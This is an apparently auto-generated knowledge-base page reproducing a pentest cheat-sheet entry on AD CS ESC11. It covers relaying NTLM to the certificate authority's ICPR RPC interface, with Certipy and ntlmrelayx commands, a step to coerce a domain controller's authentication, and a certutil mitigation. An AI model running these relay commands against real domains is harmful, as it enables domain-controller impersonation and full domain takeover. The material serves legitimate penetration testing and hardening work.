---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC11

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc11` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc11.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.

## Preserved Body

````markdown
## ESC11 - Relaying NTLM to ICPR

> Encryption is not enforced for ICPR requests and Request Disposition is set to Issue.

**Tools**:

* [ly4k/Certipy](https://github.com/ly4k/Certipy) - Certipy official
* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork
* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket fork

**Exploitation**:

1. Look for `Enforce Encryption for Requests: Disabled` in certipy output.

    ```ps1
    certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout
    Enforce Encryption for Requests : Disabled
    ESC11: Encryption is not enforced for ICPR (RPC) requests.
    ```

2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.

    ```ps1
    certipy relay -target rpc://dc.domain.local -ca 'DOMAIN-CA' -template DomainController
    # or
    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
    ```

3. Coerce authentication fomr a privileged account such as a Domain Controller.
4. Use the certificate

    ```ps1
    certipy auth -pfx dc.pfx
    ```

**Mitigations**:

Enforce **RPC Encryption** (Packet Privacy).

```powershell
certutil -getreg CA\InterfaceFlags
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

## References

* [ESC11: NTLM Relay to AD CS RPC Interface - Oliver Lyak - May 15, 2025](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc11-ntlm-relay-to-ad-cs-rpc-interface)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
* [Relaying to AD Certificate Services over RPC - SYLVAIN HEINIGER - November 16, 2022](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
````

## Source Verification

[source record](../../sources/internalallthethings/active-directory-certificate-esc11.md)

## Evidence Excerpt

````text
_body: "# Active Directory - Certificate ESC11\n\n## ESC11 - Relaying NTLM to ICPR\n\n> Encryption is not enforced for ICPR\
\ requests and Request Disposition is set to Issue.\n\n**Tools**:\n\n* [ly4k/Certipy](https://github.com/ly4k/Certipy) -\
\ Certipy official\n* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy fork\n* [sploutchy/impacket](https://github.com/sploutchy/impacket)\
\ - Impacket fork\n\n**Exploitation**:\n\n1. Look for `Enforce Encryption for Requests: Disabled` in certipy output.\n\n\
\    ```ps1\n    certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout\n    Enforce Encryption for\
\ Requests : Disabled\n    ESC11: Encryption is not enforced for ICPR (RPC) requests.\n    ```\n\n2. Setup a relay using\
\ Impacket ntlmrelay and trigger a connection to it.\n\n    ```ps1\n    certipy relay -target rpc://dc.domain.local -ca\
\ 'DOMAIN-CA' -template DomainController\n    # or\n    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name\
````
